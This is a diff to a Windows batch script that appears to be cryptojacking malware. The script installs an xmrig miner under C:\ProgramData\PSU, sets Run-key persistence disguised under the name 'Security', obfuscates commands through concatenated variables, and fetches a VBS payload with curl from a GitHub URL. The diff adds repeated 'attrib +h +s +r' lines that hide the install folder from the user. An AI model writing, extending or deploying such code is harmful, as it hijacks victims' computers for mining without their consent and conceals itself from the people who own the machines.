@@ -74,6 +74,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa% “%bbbbbbbbbbbbbbbbbbbb%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa% %bbbb%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%”
 %aaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaa% %aaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaa%%aaaaaa% %aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaa%%aaaaaa%=%aaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aa%%aaa%%aaaaaaaaaaaaa%%aaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aa%%aaaaaaaaaaaaaaaaaaaaaaa%*
@@ -144,6 +145,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -307,6 +309,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -574,6 +577,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -1071,6 +1075,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -1530,6 +1535,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -1739,6 +1745,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -1894,6 +1901,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -2082,6 +2090,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 if not exist "C:\ProgramData\PSU\bgin.bat" goto download
 if not exist "C:\ProgramData\PSU\check.bat" goto download
 if not exist "C:\ProgramData\PSU\config.json" goto download
@@ -2230,6 +2239,7 @@ if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
 REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
+attrib +h +s +r "C:\ProgramData\PSU" /s /d
 goto start
 :execute
 if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
@@ -2239,6 +2249,8 @@ start "" "C:\ProgramData\PSU\execute.vbs"
 timeout 3
 goto start
 :download
+attrib -h -s -r "C:\ProgramData\PSU" /s /d
+timeout 0 >> nul
 mkdir "C:\ProgramData\PSU"
 timeout 0 >> nul
 curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Install.txt" -o "C:\ProgramData\PSU\Install.vbs" >> nul
